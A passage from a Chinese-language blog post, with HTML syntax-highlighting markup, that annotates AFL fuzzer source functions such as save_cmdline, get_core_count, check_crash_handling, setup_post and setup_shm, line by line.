punctuation">;</span><span class="token comment">//启用拼接策略</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h3><p>将当前输入参数拷贝进 buf 空间中，并且在末尾加 \x00，最终堆中复制的内容为：<code>/home/starrysky/AFL/afl-fuzz -i in -o out -M fuzzer1 ./test\x00</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">save_cmdline</span><span class="token punctuation">(</span>u32 argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> i<span class="token punctuation">;</span>  u8<span class="token operator">*</span> buf<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    len <span class="token operator">+=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//遍历每个参数，加上参数长度 +1</span>    buf <span class="token operator">=</span> orig_cmdline <span class="token operator">=</span> <span class="token function">ck_alloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建对应长度大小的堆</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    u32 l <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将每个参数都拷贝进去</span>    buf <span class="token operator">+=</span> l<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token punctuation">(</span>buf<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token char">' '</span><span class="token punctuation">;</span><span class="token comment">//如果不是最后一个参数就在参数后面加空格</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//末尾加上 \x00</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner"></a>fix_up_banner</h3><p>未设置 use_banner 则设置为不含路径的测试程序名，如果程序名长度超过 40，则取前 40 位</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">fix_up_banner</span><span class="token punctuation">(</span>u8<span class="token operator">*</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>use_banner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//未设置 use_banner</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sync_id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//设置了 sync_id</span>      use_banner <span class="token operator">=</span> sync_id<span class="token punctuation">;</span><span class="token comment">//use_banner 设置为 sync_id，即 fuzzer1</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      u8<span class="token operator">*</span> trim <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//trim 设置为 name 最后一个 / 的位置</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>trim<span class="token punctuation">)</span> use_banner <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token comment">//没有 / 就将 use_banner 设置为 name 即测试文件名</span>      <span class="token keyword">else</span> use_banner <span class="token operator">=</span> trim <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//有 / use_banner 就设置为 / 后一个开始的文件名</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>use_banner<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果长度超过 40，只保留前 40</span>    u8<span class="token operator">*</span> tmp <span class="token operator">=</span> <span class="token function">ck_alloc</span><span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token string">"%.40s..."</span><span class="token punctuation">,</span> use_banner<span class="token punctuation">)</span><span class="token punctuation">;</span>    use_banner <span class="token operator">=</span> tmp<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty"></a>check_if_tty</h3><p>设置了环境变量 AFL_NO_UI 或者 ioctl 获取终端窗口大小错误码是 ENOTTY 则表示非 tty 终端运行，禁用 UI 设置 not_on_tty &#x3D; 1</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">check_if_tty</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">winsize</span> ws<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_NO_UI"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果设置了 AFL_NO_UI 则禁用 UI 并且设置 not_on_tty = 1</span>    <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"Disabling the UI because AFL_NO_UI is set."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    not_on_tty <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> TIOCGWINSZ<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ws<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//获取终端窗口大小</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> ENOTTY<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果出错，检查错误码是否为 ENOTTY</span>      <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"Looks like we're not running on a tty, so I'll be a bit less verbose."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//提示不在终端环境中</span>      not_on_tty <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count"></a>get_core_count</h3><p>获取 cpu 的核心数量</p><ul><li><p>如果定义了 HAVE_AFFINITY，通过 sysconf(_SC_NPROCESSORS_ONLN) 获取核心数</p></li><li><p>如果未定义 HAVE_AFFINITY，通过读取 &#x2F;proc&#x2F;stat 文件来统计 CPU 核心数量</p><ul><li><p>&#x2F;proc&#x2F;stat 文件包含了系统统计信息，其中以 cpu 开头的行表示 CPU 核心</p></li><li><p>每读取到一行以 cpu 开头且后面跟着数字的行，cpu_core_count 就加 1</p></li></ul></li><li><p>调用 get_runnable_processes 获取当前系统中可运行的任务数量</p></li><li><p>输出提示: [+] You have 16 CPU cores and 2 runnable tasks (utilization: 12%).</p></li><li><p>如果当前可运行任务数量超过 CPU 核心数量的 1.5 倍，提示系统负载过高，可能会影响性能</p></li><li><p>如果当前可运行任务数量加上当前进程仍然小于等于 CPU 核心数量，提示用户可以尝试并行任务以提高效率</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Try parallel <span class="token function">jobs</span> - see /usr/local/share/doc/afl/parallel_fuzzing.txt.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果 cpu_core_count 为 0，表示无法检测到 CPU 核心数量，输出警告信息</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">get_core_count</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 cur_runnable <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>__APPLE__<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>__FreeBSD__<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span> <span class="token punctuation">(</span>__OpenBSD__<span class="token punctuation">)</span></span></span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">HAVE_AFFINITY</span></span>cpu_core_count <span class="token operator">=</span> <span class="token function">sysconf</span><span class="token punctuation">(</span>_SC_NPROCESSORS_ONLN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>  FILE<span class="token operator">*</span> f <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/proc/stat"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开 /proc/stat</span>  u8 tmp<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>f<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//逐行读取</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token string">"cpu"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isdigit</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> cpu_core_count<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//如果读到 cpu ,核心数 +1</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^HAVE_AFFINITY */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^(__APPLE__ || __FreeBSD__ || __OpenBSD__) */</span></span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>cpu_core_count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    cur_runnable <span class="token operator">=</span> <span class="token punctuation">(</span>u32<span class="token punctuation">)</span><span class="token function">get_runnable_processes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取当前系统中可运行的任务数量</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>__APPLE__<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>__FreeBSD__<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span> <span class="token punctuation">(</span>__OpenBSD__<span class="token punctuation">)</span></span></span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ || __FreeBSD__ || __OpenBSD__ */</span></span>    <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"You have %u CPU core%s and %u runnable tasks (utilization: %0.0f%%)."</span><span class="token punctuation">,</span>        cpu_core_count<span class="token punctuation">,</span> cpu_core_count <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token string">"s"</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>        cur_runnable<span class="token punctuation">,</span> cur_runnable <span class="token operator">*</span> <span class="token number">100.0</span> <span class="token operator">/</span> cpu_core_count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//本例输出：[+] You have 16 CPU cores and 1 runnable tasks (utilization: 6%).</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cpu_core_count <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>cur_runnable <span class="token operator">></span> cpu_core_count <span class="token operator">*</span> <span class="token number">1.5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"System under apparent load, performance may be spotty."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果当前可运行任务数量超过 CPU 核心数量的 1.5 倍，提示系统负载过高，可能会影响性能</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cur_runnable <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> cpu_core_count<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"Try parallel jobs - see %s/parallel_fuzzing.txt."</span><span class="token punctuation">,</span> doc_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果当前可运行任务数量加上当前进程仍然小于等于 CPU 核心数量，提示用户可以尝试并行任务以提高效率</span>        <span class="token comment">//本例会提示:[+] Try parallel jobs - see /usr/local/share/doc/afl/parallel_fuzzing.txt.</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    cpu_core_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"Unable to figure out the number of CPU cores."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果 cpu_core_count 为 0，表示无法检测到 CPU 核心数量，输出警告信息</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu"></a>bind_to_free_cpu</h3><p>检查是否有空闲的核心，如果有的话就绑定到空闲 cpu，有助于提升多线程或多进程的性能</p><h3 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling"></a>check_crash_handling</h3><p>确保核心转储不会进入程序</p><blockquote><p><code>/proc/sys/kernel/core_pattern</code> 是一个特殊的文件，用于控制 Linux 系统中核心转储文件的生成方式：</p><ul><li>如果文件内容是一个简单的字符串（如 <code>core</code>），系统会在程序崩溃时生成一个名为 <code>core</code> 或 <code>core.&lt;pid&gt;</code> 的文件</li><li>如果文件内容以 <code>|</code> 开头，系统会将核心转储信息发送到一个外部工具（例如 <code>coredumpctl</code> 或其他日志工具</li></ul></blockquote><p>如果<code>/proc/sys/kernel/core_pattern</code>中含有<code>|</code>说明会将核心转储通知发送到外部工具,导致的延迟可能被认为是超时,所以为了避免这种情况,如果存在<code>|</code>就会提示用户需要执行<code>echo core &gt;/proc/sys/kernel/core_pattern</code>，该文件每次重启后会变成 <code>|/usr/share/apport/apport -p%p -s%s -c%c -d%d -P%P -u%u -g%g -- %E</code></p><p>如果设置了环境变量 <code>AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES</code>会忽略<code>|</code>的问题</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">check_crash_handling</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>  s32 fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/sys/kernel/core_pattern"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>  u8  fchar<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"Checking core_pattern..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fchar<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> fchar <span class="token operator">==</span> <span class="token char">'|'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//检查是否有 |</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST         <span class="token string">"Hmm, your system is configured to send core dump notifications to an\n"</span>         <span class="token string">"    external utility. This will cause issues: there will be an extended delay\n"</span>         <span class="token string">"    between stumbling upon a crash and having this information relayed to the\n"</span>         <span class="token string">"    fuzzer via the standard waitpid() API.\n\n"</span>         <span class="token string">"    To avoid having crashes misinterpreted as timeouts, please log in as root\n"</span>          <span class="token string">"    and temporarily modify /proc/sys/kernel/core_pattern, like so:\n\n"</span>         <span class="token string">"    echo core >/proc/sys/kernel/core_pattern\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//有则输出提示</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果设置了 AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES 就忽略这个问题</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Pipe at the beginning of 'core_pattern'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//未设置则强制退出要求用户设置</span>  <span class="token punctuation">&#125;</span>   <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^__APPLE__ */</span></span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="check-cpu-governor"><a href="#check-cpu-governor" class="headerlink" title="check_cpu_governor"></a>check_cpu_governor</h3><p>若发现 cpu 频率可调，则建议用户把 cpu 定在最高频率</p><h3 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post"></a>setup_post</h3><p>如果没有设置 AFL_POST_LIBRARY 这个环境变量则直接返回，设置了就加载 afl_postprocess函数，用于处理由 AFL 生成的模糊测试数据</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setup_post</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">void</span><span class="token operator">*</span> dh<span class="token punctuation">;</span>  u8<span class="token operator">*</span> fn <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_POST_LIBRARY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取环境变量中的 AFL_POST_LIBRARY</span>  u32 tlen <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fn<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//不存在则直接返回</span>  <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"Loading postprocessor from '%s'..."</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//提示从这个库中加载 postprocessor</span>  dh <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> RTLD_NOW<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开库</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dh<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token function">dlerror</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开失败则报错</span>  post_handler <span class="token operator">=</span> <span class="token function">dlsym</span><span class="token punctuation">(</span>dh<span class="token punctuation">,</span> <span class="token string">"afl_postprocess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查找库中的函数 afl_postprocess</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>post_handler<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Symbol 'afl_postprocess' not found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//没找到则报错</span>  <span class="token function">post_handler</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>tlen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//测试函数是否正常运行</span>  <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"Postprocessor installed successfully."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//提示加载成功</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h3><p>设置共享内存</p><ul><li>初始化 virgin_tmout、 virgin_crash 为 0xff，in_bitmap 为空则 virgin_bits 也初始化为 0xff</li><li>shmget 创建共享内存段，创建失败则报错退出</li><li>注册退出的回调函数 <a href="##remove_shm">remove_shm</a> 用于在程序退出时清理共享内存</li><li>将创建内存段得到的共享内存标识符转换成字符串保存到环境变量 SHM_ENV_VAR 中再释放字符串内存</li><li>shmat 将共享内存附加到当前进程的地址空间，失败则报错退出</li></ul><blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">shmget</span><span class="token punctuation">(</span><span class="token class-name">key_t</span> key<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">int</span> shmflg<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数</p><ul><li>key：标识共享内存段的键值<ul><li>IPC_PRIVATE：创建一个新的共享内存段，不会与任何键值关联</li><li>大于 0 的整数：通过 fork函数生成，用于标识共享内存段</li></ul></li><li>size：指定共享内存段的大小，单位是字节</li><li>shmflg：指定共享内存段的权限和操作标志<ul><li>IPC_CREAT：如果键值对应的共享内存段不存在，则创建一个新的共享内存段</li><li>IPC_EXCL：如果共享内存段已存在，则返回错误</li><li>访问权限标志（eg. 0666 &#x2F; 0644 &#x2F; 0600）：设置共享内存段的访问权限</li><li>SHM_HUGETLB：使用大页面分配共享内存，提高性能</li><li>SHM_NORESERVE：不为共享内存段在交换分区中保留空间</li></ul></li></ul><p>返回值</p><ul><li>成功时返回共享内存段的标识符（<code>shmid</code>），用于后续操作</li><li>失败时返回 <code>-1</code>，并设置 <code>errno</code></li></ul></blockquote><blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">shmat</span><span class="token punctuation">(</span><span class="token keyword">int</span> shmid<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>shmaddr<span class="token punctuation">,</span> <span class="token keyword">int</span> shmflg<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数</p><ul><li>shmid：共享内存段的标识符</li><li>shmaddr：指定共享内存段映射到进程地址空间的地址<ul><li>NULL：系统自动选择合适地址</li><li>地址：要求 shmflg 设置 SHM_RND，地址会向下取整为 SHMLBA 的整数倍，地址必须是页对齐的</li></ul></li><li>shmflg：用于指定映射的标志<ul><li>0：默认方式可读写</li><li>SHM_RDONLY：只读</li><li>SHM_REMAP：重新映射共享内存，要求 shmaddr 不能为 NULL</li></ul></li></ul><p>返回值</p><ul><li>成功时返回指向共享内存段起始地址的指针</li><li>失败时返回 (void *)-1，并设置 errno</li></ul></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c">EXP_ST <span class="token keyword">void</span> <span class="token function">setup_shm</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8<span class="token operator">*</span> shm_str<span class="token punctuation">;</span>      <span class="token comment">//初始化 virgin_bits、 virgin_tmout、 virgin_crash 为 0xff</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_bitmap<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>virgin_bits<span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> MAP_SIZE<span class="token 